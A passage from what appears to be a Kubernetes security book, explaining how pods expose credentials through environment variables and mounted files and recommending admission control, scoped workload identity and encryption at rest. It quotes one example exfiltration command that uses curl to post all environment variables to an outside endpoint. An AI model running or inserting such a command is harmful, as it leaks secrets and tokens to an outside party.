<p>Pods have other forms of identity injected in, including SSH and GPG keys, Kerberos and Vault tokens, ephemeral credentials, and other sensitive information. These are exposed by the <code>kubelet</code> into the pod as filesystem mounts, or environment variables.</p>

<p>Environment variables <a data-type="indexterm" data-primary="environment variables" data-secondary="security considerations" id="idm45302811575424"/>are inherited, and visible to other processes owned by the same user. The <code>env</code> command dumps them easily and an attacker can exfiltrate them easily: <code>curl -d "$(env)" https://hookb.in/swag</code>.</p>

<p>Mounted files <a data-type="indexterm" data-primary="mounted files, exfiltrating" id="idm45302811573024"/>can still be exfiltrated with the same relative ease, but are made marginally more difficult to read by filesystem permissions. This may be less relevant with a single unprivileged user that must read all its own Secrets anyway, but becomes relevant in case of shared volumes among containers in a pod.</p>

<p>Admission control policy (see <a data-type="xref" href="ch08.xhtml#policy-runtime-policies">“Runtime Policies”</a>,) can prevent host mounts entirely, or enforce read-only mount paths.</p>

<p>We will cover this topic in more detail in <a data-type="xref" href="ch07.xhtml#ch-hard-multi-tenancy">Chapter 7</a>.</p>
</div></section>





</div></section>













<section data-type="sect1" class="less_space pagebreak-before" data-pdf-bookmark="Conclusion"><div class="sect1" id="idm45302811569088">
<h1>Conclusion</h1>

<p>Volumes hold a digital business’s most valuable asset: data. It can fetch a handsome ransom.
You should prevent Captain Hashjack from accessing data using stolen credentials by using
hardened build and deployment patterns. Assuming that everything will be compromised,
using workload identity to scope cloud integrations to the pod, and assigning limited
cloud access to dedicated service accounts, make an attacker’s life more difficult.</p>

<p>Encrypting data at rest (in <code>etcd</code> and in the context of the pods consuming it)
protects it from attackers, and of course your pods that face the network and mount valuable
data are the highest impact targets to compromise.</p>
</div></section>







</div></section></div></body></html>